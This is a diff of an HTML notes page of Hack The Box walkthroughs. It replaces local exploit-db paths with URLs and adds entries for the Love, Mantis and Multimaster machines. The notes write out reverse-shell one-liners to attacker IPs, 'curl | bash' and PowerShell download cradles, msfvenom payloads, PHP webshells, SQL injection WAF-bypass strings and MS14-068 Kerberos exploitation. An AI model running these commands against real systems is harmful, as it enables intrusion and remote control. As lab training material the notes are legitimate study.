@@ -129,19 +129,25 @@
         }
 
         .very_easy {
-            color: #FFC0CB;
+            color: #a4de54;
         }
         .easy {
-            color: #8ec546; 
+            color: #00b816; 
         }
         .medium {
-            color: #f9b03d;
+            color: #ff9d00;
         }
         .hard {
             color: #ff0000;
         }
         .insane {
-            color: #9500ff;
+            color: #6d00ba;
+        }
+        a {
+            color: #fbff00;
+        }
+        a:visited {
+            color: #e600ff;
         }
         @media only screen and (max-width: 600px) {
             main {
@@ -309,7 +315,7 @@
     <div id="particles-js"></div>
     <header>
         <h2 class="glow"># joe95's Notes</h2>
-        <br><span>last_update:Dec.20.2023</span>
+        <br><span>last_update:Dec.27.2023</span>
         <script src="displayVisitorInfo.js"></script>
         <br><span id="visitorInfo"></span>
     </header>
@@ -873,7 +879,7 @@
                         <br>upload payload `http://10.10.14.15/cmd.php -o uploads/cmd.php`
                         <br>curl -G http://10.10.10.24/uploads/cmd.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.15/443 0>&1'" got www-data shell
                         <br><span class="step_title">Privilege_escalation</span>
-                        <br>GNU Screen 4.5.0 - Local Privilege Escalation /usr/share/exploitdb/exploits/linux/local/41154.sh
+                        <br>GNU Screen 4.5.0 - Local Privilege Escalation https://www.exploit-db.com/exploits/41154
                     </div>
                 </div>
                 <div class="sub_dropdown">
@@ -882,17 +888,17 @@
                         <span class="step_title">Initial_Foothold</span>
                         <br>gobuster vhost found api-prod.horizontall.htb, gobuster dir found http://api-prod.horizontall.htb/admin
                         <br>`curl http://api-prod.horizontall.htb/admin/strapiVersion` {"strapiVersion":"3.0.0-beta.17.4"}
-                        <br>Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated) /usr/share/exploitdb/exploits/multiple/webapps/50239.py
+                        <br>Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated) https://www.exploit-db.com/exploits/50239
                         <br><span class="step_title">Privilege_escalation</span>
                         <br>found something running on target local tcp/8000, setup ssh portforward
-                        <br>Laravel 8.4.2 debug mode - Remote code execution /usr/share/exploitdb/exploits/php/webapps/49424.py
+                        <br>Laravel 8.4.2 debug mode - Remote code execution https://www.exploit-db.com/exploits/49424
                     </div>
                 </div>
                 <div class="sub_dropdown">
                     <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="easy">Irked (Easy/Linux)</span> </button>                    
                     <div class="sub_dropdown_content">
                         <span class="step_title">Initial_Foothold</span>
-                        <br>UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit) /usr/share/exploitdb/exploits/linux/remote/16922.rb inspect got the gist
+                        <br>UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit) https://www.exploit-db.com/exploits/16922 inspect got the gist
                         <br>`nc 10.10.10.117 6697` and `AB; whoami`
                         <br> Or use https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor
                         <br><span class="step_title">Privilege_escalation</span>
@@ -942,7 +948,7 @@
                         <br>curl webpage found X-Powered-By: PHP/8.1.0-dev
                         <br>google found https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d
                         <br>'This line executes PHP code from within the useragent HTTP header, if the string starts with 'zerodium''
-                        <br>PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution /usr/share/exploitdb/exploits/php/webapps/49933.py
+                        <br>PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution https://www.exploit-db.com/exploits/49933
                         <br><span class="step_title">Privilege_escalation</span>
                         <br>james$ (root) NOPASSWD: /usr/bin/Knife
                         <br>https://gtfobins.github.io/gtfobins/knife/
@@ -1108,7 +1114,7 @@
                         <br>I never try this, only saw it in 0xdf's post
                         <br><span class="step_title">Privilege_escalation(www-data->root)</span>
                         <br>pspy found root cronjob `/bin/sh /usr/bin/chkrootkit`
-                        <br>Chkrootkit 0.49 - Local Privilege Escalation /usr/share/exploitdb/exploits/linux/local/33899.txt
+                        <br>Chkrootkit 0.49 - Local Privilege Escalation https://www.exploit-db.com/exploits/33899
                         <br>just put a excutable payload as /tmp/update
                         <br><span class="step_title">Privilege_escalation(www-data->amrois->root)</span>
                         <br>steganography file /var/www/ssl/secure_notes/nineveh.png
@@ -1153,7 +1159,7 @@
                         <br>HTB pdf show it took 6 hours to finish the gobuster dir
                         <br>gobuster dir found /backend which redirect to /backend/backend/auth/signin
                         <br>login success with admin:admin
-                        <br>October CMS 1.0.412 - Multiple Vulnerabilities /usr/share/exploitdb/exploits/php/webapps/41936.txt
+                        <br>October CMS 1.0.412 - Multiple Vulnerabilities https://www.exploit-db.com/exploits/41936
                         <br>it says .php5 is not in upload blacklist
                         <br>upload php oneliner as payload.php5, and click 'public URL' to trigger
                         <br><span class="step_title">Privilege_escalation</span>
@@ -1172,7 +1178,7 @@
                         <span class="step_title">Initial_Foothold</span>
                         <br>gobuster dir found /music and click 'login' redirect to /ona 
                         <br>app version on page is 18.1.1  click 'download' show the app name 'OpenNetAdmin'
-                        <br>OpenNetAdmin 18.1.1 - Remote Code Execution /usr/share/exploitdb/exploits/php/webapps/47691.sh
+                        <br>OpenNetAdmin 18.1.1 - Remote Code Execution https://www.exploit-db.com/exploits/47691
                         <br>`./47691.sh http://10.10.10.171/ona/` got www-data shell
                         <br><span class="step_title">Privilege_escalation</span>
                         <br>linpeas.sh found cred ona_sys:n1nj4W4rri0R! from /var/www/html/ona/local/config/database_settings.inc.php
@@ -1238,7 +1244,7 @@
                         <br>source code shows: worldpress 5.2.3
                         <br>gobuster vhost found chat.office.paper which is a rocket.chat app with hint:'Registration can only be done using the secret registration URL!'
                         <br>`wpscan --url http://office.paper --api-token $WPSCAN_API`
-                        <br>WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts /usr/share/exploitdb/exploits/multiple/webapps/47690.md
+                        <br>WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts https://www.exploit-db.com/exploits/47690
                         <br>'http://office.paper/?static=1' shows secret registration URL 'http://chat.office.paper/register/8qozr226AhkCHZdyY'
                         <br>register and login discover a chat bot,'recyclops help', it can read dir/files
                         <br>'file ../../../etc/passwd' shows username dwight, 'file ../hubot/.env' shows cred recyclops:Queenofblad3s!23
@@ -1256,7 +1262,7 @@
                         <br>main page hint:'implemented Fail2Ban' which means no bruteforce(hydra/gobuster)
                         <br>source code leak 'http://10.10.10.206/CuteNews/rss.php'
                         <br>'http://10.10.10.206/CuteNews/' is a login page CuteNews 2.1.2
-                        <br>CuteNews 2.1.2 - Remote Code Execution /usr/share/exploitdb/exploits/php/webapps/48800.py
+                        <br>CuteNews 2.1.2 - Remote Code Execution https://www.exploit-db.com/exploits/48800
                         <br>OR manually upload avatar in 'index.php?mod=main&opt=personal' and bypass local js file filter
                         <br>`exiftool -Comment='<?php echo "test"; system($_GET["cmd"]);?>' avatar.png `
                         <br>intercept with burp, edit 'avatar.png' into 'avatar.php'
@@ -1282,7 +1288,7 @@
                         <br>login /seeddms51x/seeddms with michelle:michelle found 'update note' version 5.1.15
                         <br>download and inspect 'CHANGELOG' 5.1.11:- fix for CVE-2019-12744 (Remote Command Execution through unvalidated file upload), add .htaccess file to data directory
                         <br>`curl http://dms-pit.htb/seeddms51x/data/.htaccess` all conf for apache, but nmap tcp/80 show nginx/1.14.1 
-                        <br>SeedDMS versions < 5.1.11 - Remote Command Execution /usr/share/exploitdb/exploits/php/webapps/47022.txt
+                        <br>SeedDMS versions < 5.1.11 - Remote Command Execution https://www.exploit-db.com/exploits/47022
                         <br>follow the steps in 47022.txt got RCE but reverse shell not work
                         <br>`curl http://dms-pit.htb/seeddms51x/data/1048576/30/1.php --data-urlencode "cmd=cat /var/www/html/seeddms51x/conf/settings.xml"`
                         <br>found db cred seeddms:ied^ieY6xoquu 
@@ -1357,7 +1363,7 @@
                         <br>Failed: ssh as matt with the key and pass, due to /etc/ssh/sshd_config has 'DenyUsers Matt'
                         <br>Success: `su matt` with password:computer2008
                         <br>10000/tcp open  http    MiniServ 1.910 (Webmin httpd) login success with matt:computer2008
-                        <br>Webmin 1.984 - Remote Code Execution (Authenticated) /usr/share/exploitdb/exploits/linux/webapps/50809.py
+                        <br>Webmin 1.984 - Remote Code Execution (Authenticated) https://www.exploit-db.com/exploits/50809
                         <br>`nc -nvlp 9001` `python3 50809.py -t https://10.10.10.160:10000 -c Matt:computer2008 -L 10.10.14.26 -P 9001 -LS 10.10.14.26:8080`
                     </div>
                 </div>
@@ -1386,7 +1392,7 @@
                     <div class="sub_dropdown_content">
                         <span class="step_title">Initial_Foothold</span>
                         <br>tcp/5080 gitlab register and login, found version 11.4.7 at /help 
-                        <br>GitLab 11.4.7 - RCE (Authenticated) (2) /usr/share/exploitdb/exploits/ruby/webapps/49334.py
+                        <br>GitLab 11.4.7 - RCE (Authenticated) (2) https://www.exploit-db.com/exploits/49334
                         <br>if using base64 encode like ippsec make sure no '+' in payload after encoded by adding space before encode
                         <br>49334.py: lpush resque:gitlab:queue:system_hook_push "{\\"class\\":\\"GitlabShellWorker\\",\\"args\\":[\\"class_eval\\",\\"open(\\'|""" + f'nc {local_ip} {local_port} -e /bin/bash' + """ \\').read\\"],\\"retry\\":3,\\"queue\\":\\"system_hook_push\\",\\"jid\\":\\"ad52abc5641173e217eb2e52\\",\\"created_at\\":1608799993.1234567,\\"enqueued_at\\":1608799993.1234567}"
                         <br>49334_fixed.py: lpush resque:gitlab:queue:system_hook_push "{\\"class\\":\\"GitlabShellWorker\\",\\"args\\":[\\"class_eval\\",\\"open(\\'|""" + f'echo YmFzaCAtYyAnL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjI2LzkwMDEgMD4mMSc= | base64 -d | bash ' + """ \\').read\\"],\\"retry\\":3,\\"queue\\":\\"system_hook_push\\",\\"jid\\":\\"ad52abc5641173e217eb2e52\\",\\"created_at\\":1608799993.1234567,\\"enqueued_at\\":1608799993.1234567}"                        
@@ -1420,7 +1426,7 @@
                     <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="easy">ScriptKiddie (Easy/Linux)</span> </button>                    
                     <div class="sub_dropdown_content">
                         <span class="step_title">Initial_Foothold</span>
-                        <br>Metasploit Framework 6.0.11 - msfvenom APK template command injection /usr/share/exploitdb/exploits/multiple/local/49491.py
+                        <br>Metasploit Framework 6.0.11 - msfvenom APK template command injection https://www.exploit-db.com/exploits/49491
                         <br>edit: payload = 'curl http://10.10.14.26/reverse-bash-i.sh|bash'
                         <br>got shell as kid
                         <br><span class="step_title">Privilege_escalation</span>
@@ -1465,7 +1471,7 @@
                         <br>gobuster dir https found /system-users.txt which shows username: Rohit password: company defaults 
                         <br>google phsense default cred got admin:phsense
                         <br>login with Rohit:phsense found version 2.1.3
-                        <br>pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection /usr/share/exploitdb/exploits/php/webapps/43560.py
+                        <br>pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection https://www.exploit-db.com/exploits/43560
                         <br>`python3 43560.py --lhost 10.10.14.26 --lport 9001 --rhost 10.10.10.60 --username rohit --password pfsense`
                         <br>listener got root                        
                     </div>
@@ -1475,7 +1481,7 @@
                     <div class="sub_dropdown_content">
                         <span class="step_title">Initial_Foothold</span>
                         <br>gobuster vhost found exam.seventeen.htb
-                        <br>Exam Reviewer Management System 1.0 - ‘id’ SQL Injection /usr/share/exploitdb/exploits/php/webapps/50725.txt
+                        <br>Exam Reviewer Management System 1.0 - ‘id’ SQL Injection https://www.exploit-db.com/exploits/50725
                         <br>use burp intercept copy to file get.req and sqlmap found 31234:autodestruction
                         <br>according to sqlmap dump 'date_uploaded: 2020-01-26' of Marksheet-finals.pdf and the hint inside 'new webmail service mastermailer.seventeen.htb'
                         <br>the 'mastermailer.seventeen.htb' is running roundcube, google search roundcube with '2020' OR /mastermailer/CHANGELOG found version 1.4.2
@@ -1517,7 +1523,7 @@
                         <br>ipmiPwner https://github.com/c0rnf13ld/ipmiPwner
                         <br>gobuster vhost found monitor.shibboleth.htb monitoring.shibboleth.htb zabbix.shibboleth.htb
                         <br>login monitor.shibboleth.htb found zabbix version 5
-                        <br>Zabbix 5.0.17 - Remote Code Execution (RCE) (Authenticated) /usr/share/exploitdb/exploits/php/webapps/50816.py
+                        <br>Zabbix 5.0.17 - Remote Code Execution (RCE) (Authenticated) https://www.exploit-db.com/exploits/50816
                         <br>OR manually 'Create item' in 'host' and put payload in 'Key' as system.run[echo ... | base64 -d | bash] and hit 'test'
                         <br><span class="step_title">Privilege_escalation(zabbix->ipmi-svc)</span>
                         <br>`su ipmi-svc` with ilovepumkinpie1
@@ -1606,9 +1612,9 @@
                         <br>webpage icon 'Magento'  `./magescan.phar scan:all swagshop.htb` found version 1.9.0.1 (but gobuster /RELEASE_NOTES.txt shows 1.7.0.2)
                         <br>found cred pdo_mysql:root:fMVWh7bDHpgZkyfqQXreTjU9:db=swagshop in /app/etc/local.xml for later use
                         <br>use 37977.py or the poc.py from github to add a admin account for /index.php/admin
-                        <br>Magento eCommerce - Remote Code Execution /usr/share/exploitdb/exploits/xml/webapps/37977.py
+                        <br>Magento eCommerce - Remote Code Execution https://www.exploit-db.com/exploits/37977
                         <br>https://github.com/joren485/Magento-Shoplift-SQLI/blob/master/poc.py
-                        <br>Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution /usr/share/exploitdb/exploits/php/webapps/37811.py
+                        <br>Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution https://www.exploit-db.com/exploits/37811
                         <br>need to edit creds and 'install_date' according to `curl -s 10.10.10.140/app/etc/local.xml | grep date` (also need python mechanize)
                         <br>`python magento_rce.py 'http://10.10.10.140/index.php/admin' "uname -a"`                        
                         <br>Another way that has patched(not verified) is https://github.com/lavalamp-/LavaMagentoBD 
@@ -1691,7 +1697,7 @@
                         <span class="step_title">Initial_Foothold</span>
                         <br>gobuster found /webservices/wp scan with `wpscan -u http://10.10.10.88/webservices/wp/ --enumerate p,t,u`
                         <br>wpscan shows 'gwolle-gb Version: 2.3.10' but 'http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt' shows a hint: '* Changed version from 1.5.3 to 2.3.10 to trick wpscan ;D'
-                        <br>WordPress Plugin Gwolle Guestbook 1.5.3 - Remote File Inclusion /usr/share/exploitdb/exploits/php/webapps/38861.txt
+                        <br>WordPress Plugin Gwolle Guestbook 1.5.3 - Remote File Inclusion https://www.exploit-db.com/exploits/38861
                         <br>serving the php-reverse-shell.php as wp-load.php and `curl http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.26/`
                         <br><span class="step_title">Privilege_escalation(www-data->onuma)</span>
                         <br>`sudo -l` (onuma) NOPASSWD: /bin/tar
@@ -1728,7 +1734,7 @@
                     <div class="sub_dropdown_content">
                         <span class="step_title">Initial_Foothold</span>
                         <br>nmap found 'nostromo 1.9.6'
-                        <br>nostromo 1.9.6 - Remote Code Execution /usr/share/exploitdb/exploits/multiple/remote/47837.py
+                        <br>nostromo 1.9.6 - Remote Code Execution https://www.exploit-db.com/exploits/47837
                         <br>`python 47837.py 10.10.10.165 80 "bash -c 'bash -i >& /dev/tcp/10.10.14.26/9001 0>&1'"`
                         <br><span class="step_title">Privilege_escalation(www-data->david)</span>
                         <br>linpeas.sh found david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/ in /var/nostromo/conf/.htpasswd
@@ -1759,7 +1765,7 @@
                         <br>OR just `cat hype_key | xxd -r -p > hype_key`
                         <br>Failed: creack with hashcat and rockyou.txt 
                         <br>tcp/443 webpage show heartbleed logo
-                        <br>OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Multiple SSL/TLS Versions)  /usr/share/exploitdb/exploits/multiple/remote/32745.py
+                        <br>OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Multiple SSL/TLS Versions)  https://www.exploit-db.com/exploits/32745
                         <br>`for i in $(seq 1 10000); do python 32745.py 10.10.10.79 | grep -v '00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00' >> mem-dump.txt; done`
                         <br>found a repeated base64 string 'aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==' in the mem-dump.txt 
                         <br>decode it got 'heartbleedbelievethehype' which works decrypt the ssh key 
@@ -1771,7 +1777,7 @@
                         <br>if 'open terminal failed: missing or unsuitable terminal: tmux-256color'
                         <br>`export TERM=xterm`
                         <br><span class="step_title">Privilege_escalation 2(hype->root)</span>
-                        <br>Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method) /usr/share/exploitdb/exploits/linux/local/40839.c
+                        <br>Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method) https://www.exploit-db.com/exploits/40839
                         <br>`gcc -pthread 40839.c -o test -lcrypt`
                         <br>`su firefart`
                     </div>
@@ -1932,7 +1938,7 @@
                     <div class="sub_dropdown_content">
                         <span class="step_title">Initial_Foothold 1</span>
                         <br>found tcp/8500 running 'ColdFusion 8' `searchsploit ColdFusion`
-                        <br>Adobe ColdFusion 8 - Remote Command Execution (RCE) /usr/share/exploitdb/exploits/cfm/webapps/50057.py
+                        <br>Adobe ColdFusion 8 - Remote Command Execution (RCE) https://www.exploit-db.com/exploits/50057
                         <br><span class="step_title">Initial_Foothold 2</span>
                         <br>http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
                         <br>found password hash 2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03 crack: happyday
@@ -1991,15 +1997,15 @@
                     <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="medium">Bastard (Medium/Windows)</span> </button>                    
                     <div class="sub_dropdown_content">
                         <span class="step_title">Initial_Foothold</span>
-                        <br>Drupal 7.x Services Module Remote Code Execution /usr/share/exploitdb/exploits/php/webapps/41564.php
+                        <br>Drupal 7.x Services Module Remote Code Execution https://www.exploit-db.com/exploits/41564
                         <br>gobuster dir found '/rest'
                         <br>edit: $url = 'http://10.10.10.9'; $endpoint_path = '/rest'; 'filename' => 'shell.php', 'data' => '<?php echo test;system($_REQUEST["cmd"]); ?>'
                         <br>`php 41564.php`  File written: http://10.10.10.9/shell.php
                         <br>`curl http://10.10.10.9/shell.php --data-urlencode "cmd=\\\\10.10.14.26\\share\\nc.exe -e cmd 10.10.14.26 9001"`
                         <br>OR 44449.rb edit with `dos2unix 44449.rb` and use burp to turn 'POST to CHANGELOG.txt' into 'GET to CHANGELOG.txt' and let go others
-                        <br>Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution /usr/share/exploitdb/exploits/php/webapps/44449.rb
+                        <br>Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution https://www.exploit-db.com/exploits/44449
                         <br>OR 44542.txt
-                        <br>Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC) /usr/share/exploitdb/exploits/php/webapps/44542.txt
+                        <br>Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC) https://www.exploit-db.com/exploits/44542
                         <br><span class="step_title">Privilege_escalation(iusr->system)</span>
                         <br>0xdf run `\\10.10.14.14\share\Watson.exe` on target found MS11-046 
                         <br>making watson.exe 
@@ -2124,11 +2130,11 @@
                     <div class="sub_dropdown_content">
                         <span class="step_title">Initial_Foothold</span>
                         <br>8080/contact.php show 'Gym Management Software 1.0'
-                        <br>Gym Management System 1.0 - Unauthenticated Remote Code Execution /usr/share/exploitdb/exploits/php/webapps/48506.py
+                        <br>Gym Management System 1.0 - Unauthenticated Remote Code Execution https://www.exploit-db.com/exploits/48506
                         <br>`python2 48506.py http://10.10.10.198:8080/`
                         <br><span class="step_title">Privilege_escalation(shaun->administrator)</span>
                         <br>`netstat` and `tasklist` found 'CloudMe.exe' running 'TCP 127.0.0.1:8888'
-                        <br>CloudMe 1.11.2 - Buffer Overflow (PoC) /usr/share/exploitdb/exploits/windows/remote/48389.py
+                        <br>CloudMe 1.11.2 - Buffer Overflow (PoC) https://www.exploit-db.com/exploits/48389
                         <br>`msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.26 lport=9002 -b '\x00\x0A\x0D' -f python -v payload`
                         <br>kali# chisel_1.7.6_linux_amd64 server -p 8000 --reverse
                         <br>target> chisel.exe client 10.10.14.26:8000 R:8888:127.0.0.1:8888
@@ -2165,7 +2171,7 @@
                     <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="medium">Chatterbox (Medium/Windows)</span> </button>                    
                     <div class="sub_dropdown_content">
                         <span class="step_title">Initial_Foothold</span>
-                        <br>Achat 0.150 beta7 - Remote Buffer Overflow /usr/share/exploitdb/exploits/windows/remote/36025.py
+                        <br>Achat 0.150 beta7 - Remote Buffer Overflow https://www.exploit-db.com/exploits/36025
                         <br>`msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell -c \"iex(new-object net.webclient).downloadstring('http://10.10.14.29/Invoke-PowerShellTcp.ps1')\"" -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python`
                         <br>if using '-a x86 --platform Windows -p windows/meterpreter/reverse_tcp' the shell died very quick, unless using msf auto-migrate
                     </div>
@@ -2273,7 +2279,7 @@
                     <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="easy">Grandpa (Easy/Windows)</span> </button>                    
                     <div class="sub_dropdown_content">
                         <span class="step_title">Initial_Foothold</span>
-                        <br>Failed: Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow /usr/share/exploitdb/exploits/windows/remote/41738.py
+                        <br>Failed: Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow https://www.exploit-db.com/exploits/41738
                         <br>but when `searchsploit -m 41738` shows 'Codes: CVE-2017-7269' 
                         <br>https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell
                         <br>https://github.com/crypticdante/CVE-2017-7269/blob/main/ii6_reverse_shell.py
@@ -2374,358 +2380,896 @@
                     <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="easy">Love (Easy/Windows)</span> </button>                    
                     <div class="sub_dropdown_content">
                         <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
+                        <br>The TLS certificate shows user roy and domain love.htb, staging.love.htb
+                        <br>http://staging.love.htb click 'demo' lead to /beta.php which is a URL file scaner that can abuse as SSRF(Server Side Request Forgery)
+                        <br>SSRF http://127.0.0.1:5000/ output the 'Voting System' cred admin:@LoveIsInTheAir!!!!
+                        <br>Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution) https://www.exploit-db.com/exploits/49445
+                        <br>edit the script, note that the 4 URL need remove '/votesystem' part
+                        <br>`python3 49445_edited.py`
+                        <br>manually: update admin profile photo with cmd.php, and trigger with /images/cmd.php
+                        <br><span class="step_title">Privilege_escalation(phoebe-system)</span>
+                        <br>winpeas.exe found 'AlwaysInstallElevated set to 1 in HKCU and HKLM' which means a user of any privilege can install .msi files as NT AUTHORITY\SYSTEM
+                        <br>manually confirm: `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
+                        <br>manually confirm: `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
+                        <br>According to Tib3rius, both registry need to enabled and set to 1 in order for priv_esc to work
+                        <br>`msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.11 lport=9001 -f msi -o 9001.msi`
+                        <br>upload and `msiexec /quiet /qn /i 9001.msi`
+                        <br>`msiexec /?` will pop gui manual, I'll save the flags note here
+                        <br>'/quiet' Quiet mode, no user interaction, '/qn' No UI, '/i' Installs or configures a product
+                    </div>
+                </div>
+                <div class="sub_dropdown">
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="hard">Mantis (Hard/Windows)</span> </button>                    
+                    <div class="sub_dropdown_content">
+                        <br>`kerbrute_linux_amd64 userenum --domain htb.local --dc 10.10.10.52 --threads 50 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt` found username 'james' 'mantis'
+                        <br>Failed: `GetNPUsers.py 'htb.local/' -usersfile ./users.txt -format hashcat -outputfile hashes.asreproast -dc-ip 10.10.10.52`
+                        <br>gobuster dir http port 1337 found /secure_notes which leak /secure_notes/dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt which has 'OrchardCMS admin creadentials 010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001'
+                        <br>decrypted by cyberchef with 'magic' method got admin:@dm!n_P@ssW0rd!
+                        <br>`mssqlclient.py 'admin:m$$ql_S@_P@ssW0rd!@10.10.10.52'` OR `sqsh -S 10.10.10.52 -U admin -P 'm$$ql_S@_P@ssW0rd!'`
+                        <br>`SELECT * FROM orcharddb.INFORMATION_SCHEMA.COLUMNS;`
+                        <br>`USE orcharddb; SELECT * FROM blog_Orchard_Users_UserPartRecord;` found james:J@m3s_P@ssW0rd!
+                        <br>no shell for james, so the next step won't be called priv_esc
+                        <br>ippsec and 0xdf both find MS14-068 with "lots of research"
+                        <br>https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek
+                        <span class="step_title">ippsec's_HTB_offical_pdf</span>
+                        <br>`rpcclient -U htb.local/james 10.10.10.52` enter password and `lookupnames james` got james S-1-5-21-4220043660-4019079961-2895681657-1103 (User: 1)
+                        <br>`python ~/tool/windows-kernel-exploits-master/MS14-068/pykek/ms14-068.py -u james@htb.local -d mantis.htb.local -p J@m3s_P@ssW0rd! -s S-1-5-21-4220043660-4019079961-2895681657` output silver ticket TGT_james@htb.local.ccache
+                        <br>`cp TGT_james@htb.local.ccache /tmp/krb5cc_0`
+                        <br>`goldenPac.py  htb.local/james@mantis.htb.local`
+                        <br>got system shell
+                        <span class="step_title">0xdf's_walkthrough</span>
+                        <br>`apt-get install krb5-user cifs-utils`
+                        <br>/etc/hosts: 10.10.10.52 mantis.htb.local mantis
+                        <br>/etc/resolv.conf: nameserver 10.10.10.52
+                        <br>/etc/krb5.conf: 
+                        <br>[libdefaults]
+                        <br>    default_realm = HTB.LOCAL
+                        <br>[realms]
+                        <br>    htb.local = {
+                        <br>        kdc = mantis.htb.local:88
+                        <br>        admin_server = mantis.htb.local
+                        <br>        default_domain = htb.local
+                        <br>    }
+                        <br>[domain_realm]
+                        <br>    .domain.internal = htb.local
+                        <br>    domain.internal = htb.local
+                        <br>`ntpdate 10.10.10.52`
+                        <br>`kinit james` enter password
+                        <br>`klist` verify ticket
+                        <br>`rpcclient -U htb.local/james 10.10.10.52` enter password and `lookupnames james` got james S-1-5-21-4220043660-4019079961-2895681657-1103 (User: 1)
+                        <br>`python /opt/pykek/ms14-068.py -u james@htb.local -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis.htb.local` enter password
+                        <br>`cp TGT_james@htb.local.ccache /tmp/krb5cc_0`
+                        <br>`smbclient -W htb.local //mantis/c$ -k` this smb session can get both flags
+                        <br>`goldenPac.py 'htb.local/james:J@m3s_P@ssW0rd!@mantis'`
+                    </div>
+                </div>
+                <div class="sub_dropdown">
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="insane">Multimaster (Insane/Windows)</span> </button>                    
+                    <div class="sub_dropdown_content">
+                        <span class="step_title">Initial_Foothold</span>
+                        <br>`curl -X POST http://10.10.10.179/api/getColleagues -H 'Content-Type: application/json' -d '{"name":""}'` save usernames
+                        <br>save burp request to a file and sqlmap with burp inspection
+                        <br>`sqlmap -r colleagues.request --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch --proxy http://127.0.0.1:8080 --dump-all --exclude-sysdbs`
+                        <br>The charunicodeescape tamper plugin will unicode encode all the characters in the payload. This will avoid the WAF checking for bad characters.
+                        <br>manual SQL Injection with UTF-16 format: eg. ' encoded_to \u0027
+                        <br>test' OR 1=1 -- -
+                        <br>encoded: \u0074\u0065\u0073\u0074\u0027\u0020\u004f\u0052\u0020\u0031\u003d\u0031\u0020\u002d\u002d\u0020\u002d
+                        <br>' order by 5-- -
+                        <br>output: normal all users
